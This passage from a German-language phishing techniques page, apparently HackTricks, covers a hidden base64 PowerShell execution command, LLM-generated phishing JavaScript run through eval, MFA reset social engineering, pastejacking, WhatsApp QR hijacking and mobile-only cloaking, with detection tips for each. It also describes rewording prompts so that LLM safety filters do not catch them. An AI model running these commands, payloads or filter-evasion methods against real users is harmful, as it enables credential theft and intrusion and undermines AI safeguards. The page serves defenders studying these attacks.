powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dadurch bleibt die C2-Flexibilität erhalten (der Server kann Aufgaben austauschen, ohne die DLL zu aktualisieren), und Konsolenfenster werden verborgen. Suchen Sie nach PowerShell-Prozessen als Kindprozessen von `rundll32.exe`, die gemeinsam `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` verwenden.
* Verteidiger können nach HTTP(S)-Callbacks der Form `...page.php?tynor=<COMPUTER>sss<USER>` sowie nach 5-Minuten-Abfrageintervallen nach dem Laden der DLL suchen.

---

## KI-gestützte Phishing-Operationen
Angreifer verknüpfen inzwischen **LLM- und Voice-Clone-APIs** für vollständig personalisierte Köder und Interaktionen in Echtzeit.

| Ebene | Beispielhafte Nutzung durch den Threat Actor |
|-------|----------------------------------------------|
|Automation|Mehr als 100.000 E-Mails / SMS mit variierter Formulierung und Tracking-Links generieren und versenden.|
|Generative AI|*Einmalige* E-Mails erstellen, die sich auf öffentliche M&A sowie Insider-Witze aus sozialen Medien beziehen; Deepfake-CEO-Stimme bei einem Rückrufbetrug einsetzen.|
|Agentic AI|Autonom Domains registrieren, Open-Source-Informationen sammeln und Folgemails erstellen, wenn ein Opfer klickt, aber keine Zugangsdaten übermittelt.|

**Abwehr:**
• **Dynamische Banner** hinzufügen, die Nachrichten hervorheben, die aus nicht vertrauenswürdiger Automation versendet wurden (über ARC/DKIM-Anomalien).
• **Voice-biometrische Challenge-Phrasen** für risikoreiche telefonische Anfragen einsetzen.
• Kontinuierlich KI-generierte Köder in Awareness-Programmen simulieren – statische Vorlagen sind veraltet.

Siehe auch – Missbrauch agentischer Browser beim Credential-Phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – Missbrauch lokaler CLI-Tools und MCP durch KI-Agenten (für Secrets-Inventarisierung und Erkennung):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-gestützte Laufzeit-Zusammenstellung von Phishing-JavaScript (Codegenerierung im Browser)

Angreifer können harmlos aussehendes HTML ausliefern und den **Stealer zur Laufzeit generieren**, indem sie eine **vertrauenswürdige LLM-API** nach JavaScript fragen und dieses anschließend im Browser ausführen (z. B. über `eval` oder ein dynamisches `<script>`).<sup>[[7]](#references)</sup>

1. **Prompt-as-Obfuscation:** Exfil-URLs/Base64-Strings im Prompt codieren; die Formulierung iterativ anpassen, um Sicherheitsfilter zu umgehen und Halluzinationen zu reduzieren.
2. **Client-seitiger API-Aufruf:** Beim Laden ruft JS ein öffentliches LLM (Gemini/DeepSeek/usw.) oder einen CDN-Proxy auf; im statischen HTML sind nur der Prompt/API-Aufruf enthalten.
3. **Zusammenstellen und Ausführen:** Die Antwort zusammenfügen und ausführen (polymorph pro Besuch):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** Der generierte Code personalisiert den Köder (z. B. LogoKit token parsing) und sendet creds an den im Prompt verborgenen endpoint.

**Evasion-Merkmale**
- Der Traffic erreicht bekannte LLM-Domains oder renommierte CDN-Proxies; manchmal über WebSockets zu einem Backend.
- Kein statischer Payload; bösartiges JS existiert erst nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen **einzigartige Stealer** pro Session.

**Detection-Ideen**
- Sandboxes mit aktiviertem JS ausführen; **zur Laufzeit ausgeführtes `eval`/dynamische Skripterstellung aus LLM-Antworten** markieren.
- Nach Frontend-POSTs an LLM-APIs suchen, auf die unmittelbar `eval`/`Function` mit dem zurückgegebenen Text folgt.
- Bei nicht genehmigten LLM-Domains im Client-Traffic plus anschließenden Credential-POSTs alarmieren.

---

## MFA Fatigue / Push Bombing Variant – Erzwungener Reset
Neben klassischem Push-Bombing erzwingen Angreifer während des Helpdesk-Anrufs einfach eine **neue MFA-Registrierung** und machen dadurch das vorhandene Token des Benutzers ungültig. Jede anschließende Login-Aufforderung erscheint für das Opfer legitim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Überwache AzureAD-/AWS-/Okta-Ereignisse, bei denen **`deleteMFA` + `addMFA`** innerhalb weniger Minuten von derselben IP-Adresse aus auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können bösartige Befehle unbemerkt von einer kompromittierten oder typosquatteten Webseite in die Zwischenablage des Opfers kopieren und den Benutzer dann dazu bringen, sie in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen. Dadurch wird beliebiger Code ohne Download oder Anhang ausgeführt.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobiles Phishing & Verteilung bösartiger Apps (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijacking der WhatsApp-Geräteverknüpfung durch QR-Social-Engineering
* Eine Köderseite (z. B. ein gefälschter „Kanal“ eines Ministeriums oder CERT) zeigt einen WhatsApp-Web-/Desktop-QR-Code an und weist das Opfer an, ihn zu scannen. Dadurch wird der Angreifer unbemerkt als **verknüpftes Gerät** hinzugefügt.<sup>[[10]](#references)</sup>
* Der Angreifer erhält sofort Einblick in Chats und Kontakte, bis die Sitzung entfernt wird. Opfer sehen möglicherweise später eine Benachrichtigung über ein „neues verknüpftes Gerät“. Verteidiger können nach unerwarteten Ereignissen zur Geräteverknüpfung suchen, die kurz nach dem Besuch nicht vertrauenswürdiger QR-Seiten auftreten.

### Mobilgeräte-erzwungenes Phishing zur Umgehung von Crawlern/Sandboxes
Betreiber schalten ihre Phishing-Abläufe zunehmend hinter eine einfache Geräteprüfung, sodass Desktop-Crawler die finalen Seiten nie erreichen. Ein gängiges Muster ist ein kleines Script, das prüft, ob ein touchfähiges DOM vorhanden ist, und das Ergebnis an einen Server-Endpunkt sendet. Nicht-mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobilen Benutzern der vollständige Ablauf bereitgestellt wird.<sup>[[6]](#references)</sup>

Minimales Client-Snippet (typische Logik):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js`-Logik (vereinfacht):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Serververhalten, das häufig beobachtet wird:
- Setzt beim ersten Laden ein Session-Cookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei nachfolgenden GETs `500` (oder einen Platzhalter) zurück, wenn `is_mobile=false`; liefert Phishing nur, wenn `true`.

Heuristiken für die Suche und Erkennung:
- urlscan-Abfrage: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Abfolge von `GET /static/detect_device.js` → `POST /detect` → HTTP 500 für nicht mobile Clients; legitime Pfade für mobile Opfer liefern 200 mit nachfolgendem HTML/JS.
- Seiten blockieren oder genauer prüfen, die Inhalte ausschließlich anhand von `ontouchstart` oder ähnlichen Geräteprüfungen bereitstellen.

Tipps zur Abwehr:
- Crawler mit mobilähnlichen Fingerprints und aktiviertem JS ausführen, um geschützte Inhalte sichtbar zu machen.
- Bei verdächtigen 500-Antworten nach `POST /detect` auf neu registrierten Domains alarmieren.

## Referenzen

- [1] [Generierung von Domainvarianten, die bei Phishing verwendet werden (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing finden: Tools und Techniken (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Sitzungen stehlen und 2FA mit EvilnoVNC umgehen (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [DKIM mit Postfix unter Debian Wheezy installieren und konfigurieren (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [Globaler Incident-Response-Bericht 2025 von Unit 42 – Ausgabe zu Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – mobile-gesteuerte Phishing-Infrastruktur und Heuristiken (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [Die nächste Grenze von Runtime-Assembly-Angriffen: Einsatz von LLMs zur Echtzeitgenerierung von Phishing-JavaScript](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, Click Hijacking und TDS: Einblicke in ein Malware-Distributionsökosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Datenverkehr zu Microsofts windows.com mit Bitflipping hijacken (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Liebe? Eigentlich: Gefälschte Dating-App dient als Köder in gezielter Spyware-Kampagne in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [IoCs und Samples von ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
